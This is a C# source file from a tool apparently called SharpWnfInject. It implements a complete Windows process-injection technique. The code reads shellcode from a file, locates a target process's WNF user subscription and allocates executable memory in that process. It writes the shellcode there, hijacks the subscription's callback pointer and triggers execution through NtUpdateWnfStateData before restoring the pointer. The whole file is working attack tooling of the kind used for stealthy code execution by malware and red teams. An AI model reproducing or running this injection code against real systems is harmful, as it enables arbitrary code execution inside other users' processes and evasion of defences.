using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using SharpWnfInject.Interop;

namespace SharpWnfInject.Library
{
    class Modules
    {
        public static bool InjectShellcode(
            int pid,
            ulong stateName,
            string filePath,
            bool debug)
        {
            string fullPath;
            byte[] shellcode;

            try
            {
                fullPath = Path.GetFullPath(filePath);
            }
            catch (SecurityException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }
            catch (ArgumentNullException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }
            catch (NotSupportedException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }
            catch (PathTooLongException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }

            if (File.Exists(fullPath))
            {
                try
                {
                    shellcode = File.ReadAllBytes(fullPath);
                }
                catch (ArgumentException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (PathTooLongException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (DirectoryNotFoundException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (IOException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (NotSupportedException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (SecurityException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }

                return InjectShellcode(pid, stateName, shellcode, debug);
            }
            else
            {
                Console.WriteLine("[-] Specified file is not exist.\n");

                return false;
            }
        }

        public static bool InjectShellcode(
            int pid,
            ulong stateName,
            byte[] shellcode,
            bool debug)
        {
            int ntstatus;
            int error;
            PeProcess proc;
            bool is64bit;
            ulong stateNameToInject = 0UL;
            Dictionary<ulong, IntPtr> nameSubscriptions;
            Dictionary<IntPtr, Dictionary<IntPtr, IntPtr>> userSubscriptions;
            Dictionary<IntPtr, IntPtr> callback;
            IntPtr pUserSubscription;
            IntPtr pCallbackPointer;
            IntPtr pShellcode;
            IntPtr pCallbackOrigin;
            IntPtr lpNumberOfBytesWritten;
            uint nOffsetCallback;
            uint nBytesWritten;

            if (debug)
            {
                Console.WriteLine("[>] Trying to enable SeDebugPrivilege.");

                if (Utilities.EnableDebugPrivilege())
                    Console.WriteLine("    |-> Status : SUCCESS");
                else
                    Console.WriteLine("    |-> Status : FAILED");
            }

            Console.WriteLine("[>] Trying to open the target process.");

            try
            {
                proc = new PeProcess(pid);
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine("[!] Failed to open the specified process.");
                Console.WriteLine("    |-> {0}\n", ex.Message);

                return false;
            }
            catch (KeyNotFoundException ex)
            {
                Console.WriteLine("[!] Failed to open the specified process.");
                Console.WriteLine("    |-> {0}\n", ex.Message);

                return false;
            }
            catch (Win32Exception ex)
            {
                Console.WriteLine("[!] Failed to open the specified process.");
                Console.WriteLine("    |-> {0}\n", ex.Message);

                return false;
            }

            is64bit = (proc.GetArchitecture() == "x64");

            Console.WriteLine("[+] Target process is opened successfully.");
            Console.WriteLine("    |-> Process Name : {0}", proc.GetProcessName());
            Console.WriteLine("    |-> Process ID   : {0}", proc.GetProcessId());
            Console.WriteLine("    |-> Architecture : {0}", proc.GetArchitecture());
            Console.WriteLine("[>] Trying to get WNF_SUBSCRIPTION_TABLE.");

            IntPtr pSubscriptionTable = Utilities.GetSubscriptionTable(proc);

            if (pSubscriptionTable == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get valid WNF_SUBSCRIPTION_TABLE.");
                proc.Dispose();

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got valid WNF_SUBSCRIPTION_TABLE.");
                Console.WriteLine("    |-> Address : 0x{0}", pSubscriptionTable.ToString(is64bit ? "X16" : "X8"));
            }

            Console.WriteLine("[>] Trying to get WNF_NAME_SUBSCRIPTION(s).");

            nameSubscriptions = Utilities.GetNameSubscriptions(proc, pSubscriptionTable);

            if (nameSubscriptions.Count == 0)
            {
                Console.WriteLine("[-] Failed to get WNF_NAME_SUBSCRIPTION.");
                proc.Dispose();

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got {0} WNF_NAME_SUBSCRIPTION(s).", nameSubscriptions.Count);
                Console.WriteLine("[>] Searching the WNF_NAME_SUBSCRIPTION for the specified WNF State Name.");

                foreach (var key in nameSubscriptions.Keys)
                {
                    if (key == stateName)
                    {
                        stateNameToInject = key;

                        break;
                    }
                }

                if (stateNameToInject == 0UL)
                {
                    Console.WriteLine("[-] The target process does not use the specified WNF State Name.");
                    Console.WriteLine(
                        "    |-> WNF State Name : 0x{0} ({1})",
                        stateName.ToString("X16"),
                        Helpers.GetWnfName(stateName));

                    proc.Dispose();

                    return false;
                }
                else
                {
                    Console.WriteLine("[+] Got WNF_NAME_SUBSCRIPTION for the specified WNF State Name.");
                    Console.WriteLine(
                        "    |-> WNF State Name : {0} (0x{1})",
                        Helpers.GetWnfName(stateNameToInject),
                        stateNameToInject.ToString("X16"));
                    Console.WriteLine(
                        "    |-> Address        : 0x{0}",
                        nameSubscriptions[stateNameToInject].ToString(is64bit ? "X16" : "X8"));
                }
            }

            Console.WriteLine("[>] Trying to get WNF_USER_SUBSCRIPTION(s) for the target WNF_NAME_SUBSCRIPTION.");

            if (Helpers.IsWin11())
                userSubscriptions = Utilities.GetUserSubscriptionsWin11(proc, nameSubscriptions[stateNameToInject]);
            else
                userSubscriptions = Utilities.GetUserSubscriptions(proc, nameSubscriptions[stateNameToInject]);

            if (userSubscriptions.Count == 0)
            {
                Console.WriteLine("[-] No WNF_USER_SUBSCRIPTION.");
                proc.Dispose();

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got {0} WNF_USER_SUBSCRIPTION(s).", userSubscriptions.Count);
            }

            pUserSubscription = userSubscriptions.Keys.First();
            callback = userSubscriptions[pUserSubscription];
            pCallbackOrigin = callback.Keys.First();

            if (is64bit)
            {
                nOffsetCallback = (uint)Marshal.OffsetOf(
                    typeof(Win32Struct.WNF_USER_SUBSCRIPTION64),
                    "Callback");
            }
            else
            {
                nOffsetCallback = (uint)Marshal.OffsetOf(
                    typeof(Win32Struct.WNF_USER_SUBSCRIPTION32),
                    "Callback");
            }

            pCallbackPointer = new IntPtr(userSubscriptions.Keys.First().ToInt64() + nOffsetCallback);

            Console.WriteLine("[>] Trying to inject shellccode to the following WNF_USER_SUBSCRIPTION.");
            Console.WriteLine(
                "    |-> Address  : 0x{0}",
                pUserSubscription.ToString(is64bit ? "X16" : "X8"));
            Console.WriteLine(
                "    |-> Callback : 0x{0} ({1})",
                pCallbackOrigin.ToString(is64bit ? "X16" : "X8"),
                Helpers.GetSymbolPath(proc.GetProcessHandle(), pCallbackOrigin));
            Console.WriteLine(
                "    |-> Context  : 0x{0} ({1})",
                callback[pCallbackOrigin].ToString(is64bit ? "X16" : "X8"),
                Helpers.GetSymbolPath(proc.GetProcessHandle(), callback[pCallbackOrigin]));

            if (Environment.Is64BitProcess && !is64bit)
                Console.WriteLine("    |-> Warning  : To get detailed symbol information of WOW64 process, should be built as 32bit binary.");

            Console.WriteLine("[>] Trying to allocate shellcode buffer in remote process.");

            pShellcode = Win32Api.VirtualAllocEx(
                proc.GetProcessHandle(),
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32Const.MemoryAllocationFlags.MEM_COMMIT | Win32Const.MemoryAllocationFlags.MEM_RESERVE,
                Win32Const.MemoryProtectionFlags.PAGE_EXECUTE_READ);

            if (pShellcode == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to allocate shellcode buffer.");
                Console.WriteLine("    |-> {0}.", Helpers.GetWin32ErrorMessage(error, false));
                proc.Dispose();

                return false;
            }
            else
            {
                Console.WriteLine("[+] Shellcode buffer is allocated successfully.");
                Console.WriteLine("    |-> Shellcode buffer : 0x{0}", pShellcode.ToString(is64bit ? "X16" : "X8"));
            }

            Console.WriteLine("[>] Trying to write shellcode to remote process.");

            lpNumberOfBytesWritten = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(uint)));

            if (!Win32Api.WriteProcessMemory(
                proc.GetProcessHandle(),
                pShellcode,
                shellcode,
                (uint)shellcode.Length,
                lpNumberOfBytesWritten))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to write shellcode to buffer.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                Marshal.FreeHGlobal(lpNumberOfBytesWritten);
                proc.Dispose();

                return false;
            }
            else
            {
                nBytesWritten = (uint)Marshal.ReadInt32(lpNumberOfBytesWritten);
                Marshal.FreeHGlobal(lpNumberOfBytesWritten);
                Console.WriteLine("[+] Shellcode are written successfully.");
                Console.WriteLine("    |-> Shellcode Length : {0} byte(s)", nBytesWritten);
            }

            Console.WriteLine("[>] Trying to overwrite callback function pointer.");

            if (!Win32Api.WriteProcessMemory(
                    proc.GetProcessHandle(),
                    pCallbackPointer,
                    is64bit ? BitConverter.GetBytes(pShellcode.ToInt64()) : BitConverter.GetBytes(pShellcode.ToInt32()),
                    is64bit ? 8u: 4u,
                    IntPtr.Zero))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to overwrite callback function pointer.");
                Console.WriteLine("    |-> {0}.", Helpers.GetWin32ErrorMessage(error, false));
                proc.Dispose();

                return false;
            }
            else
            {
                Console.WriteLine("[+] Callback function pointer is overwritten successfully.");
            }

            ntstatus = Win32Api.NtUpdateWnfStateData(
                in stateNameToInject,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0);

            if (ntstatus != Win32Const.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to update WNF State Data.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
            }
            else
            {
                Console.WriteLine("[+] WNF State Data is updated successfully.");
            }

            Console.WriteLine("[>] Trying to revert callback function pointer.");

            if (!Win32Api.WriteProcessMemory(
                    proc.GetProcessHandle(),
                    pCallbackPointer,
                    is64bit ? BitConverter.GetBytes(pCallbackOrigin.ToInt64()) : BitConverter.GetBytes(pCallbackOrigin.ToInt32()),
                    is64bit ? 8u : 4u,
                    IntPtr.Zero))
            {
                Console.WriteLine("[-] Failed to revert callback function pointer.");
            }
            else
            {
                Console.WriteLine("[+] Callback function pointer is reverted successfully.");
            }

            proc.Dispose();

            return (ntstatus == Win32Const.STATUS_SUCCESS);
        }
    }
}
